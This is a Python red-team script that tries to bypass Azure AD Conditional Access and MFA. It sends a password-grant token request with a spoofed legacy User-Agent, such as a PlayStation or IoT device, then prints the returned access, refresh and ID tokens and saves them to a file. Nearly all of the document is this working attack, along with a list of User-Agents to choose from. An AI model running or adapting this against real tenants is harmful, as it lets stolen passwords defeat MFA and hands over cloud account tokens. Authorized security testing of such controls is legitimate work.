"""
UA_MFA_bypass.py
----------------

This script performs an Azure AD authentication attempt using the ROPC (Resource Owner Password Credential) flow
and simulates a non-browser or legacy client by spoofing the User-Agent header (e.g., PlayStation 4).

Purpose:
    - To test whether Conditional Access or MFA can be bypassed by using a legacy/non-interactive client.
    - To retrieve OAuth tokens (access, refresh, ID) directly without browser interaction.

Functionality:
    - Prompts the user for a username and password securely.
    - Sends a token request to Azure AD with a spoofed User-Agent.
    - If successful, extracts, prints and saves the access, refresh, and ID tokens.

Requirements:
    - Python 3.x
    - Internet connection
    - Valid Azure AD username and password (ROPC must be permitted in tenant)
    - Conditional Access should not enforce MFA on the simulated user-agent

How to Use:
    1. Run the script: `python interactive_token_to_var.py`
    2. Enter Azure AD username and password when prompted.
    3. If successful, the script will:
        - Display the tokens
        - Saves retrieved tokens to `token_scope.json`

Disclaimer:
    This script is for security research and red team testing in controlled environments.
    Do not use without proper authorization.

Author:
    @fhd342gs
"""


import requests
from getpass import getpass
import json


### Legacy / non-stadard user-agents. Chose you poison:

# PlayStation 4          - Mozilla/5.0 (PlayStation 4 3.11) AppleWebKit/537.73 (KHTML, like Gecko)
# PlayStation 5          - Mozilla/5.0 (PlayStation 5 4.03) AppleWebKit/605.1.15 (KHTML, like Gecko)
# PS Vita                - Mozilla/5.0 (PlayStation Vita 3.60) AppleWebKit/537.73 (KHTML, like Gecko)
# Xbox One               - Xbox/One/10.0.10586.1100 Mozilla/5.0
# Nintendo Switch	     - Mozilla/5.0 (Nintendo Switch; WifiWebAuthApplet) AppleWebKit/601.6 (KHTML, like Gecko)
# Wii U                  - Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko)
# BlackBerry 6           - BlackBerry9700/5.0.0.862 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/331
# Symbian S60            - Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 Nokia5800) AppleWebKit/525 (KHTML, like Gecko) BrowserNG/7.1.12344
# Smart TV (Samsung)     - Mozilla/5.0 (SMART-TV; Linux; Tizen 3.0) AppleWebKit/537.36
# Amazon Echo            - Dalvik/2.1.0 (Linux; U; Android 5.1; AFTS Build/LMY47O)
# Sonos Speaker          - Linux UPnP/1.0 Sonos/34.16-37101 (ZP120)
# Generic IoT            - iot-device/1.0 (Linux; U; Android 9; en-us)


# Prompt for creds
email = input("Enter username (email): ")
password = getpass("Enter password: ")

headers = {
    "User-Agent": "Mozilla/5.0 (PlayStation 4 3.11) AppleWebKit/537.73 (KHTML, like Gecko)",
    "Content-Type": "application/x-www-form-urlencoded"
}

data = {
    #"resource": "https://graph.microsoft.com", # change target if needed
    "resource": "https://management.azure.com",
    "client_id": "1b730954-1685-4b74-9bfd-dac224a7b894",  # Azure PowerShell client
    "grant_type": "password",
    "username": email,
    "password": password,
    "scope": "openid"
}

response = requests.post(
    "https://login.microsoftonline.com/common/oauth2/token",
    headers=headers,
    data=data
)

if response.status_code == 200:
    print("\n✅ Tokens retrieved successfully.\n")
    token_data = response.json()
    print(json.dumps(token_data, indent=7))
    #for key, value in token_data.items():
        #print(f'"{key}": {json.dumps(value, indent=7)}\n')


    # Save token to file
    with open("token_scope.json", "w") as f:
        json.dump(token_data, f, indent=2)
    print("\n💾 Tokens saved to token_scope.json")

else:
    print(f"\n❌ Login failed ({response.status_code}):\n")
    try:
        error_data = response.json()
        print(json.dumps(error_data, indent=2))
    except:
        print(response.text)
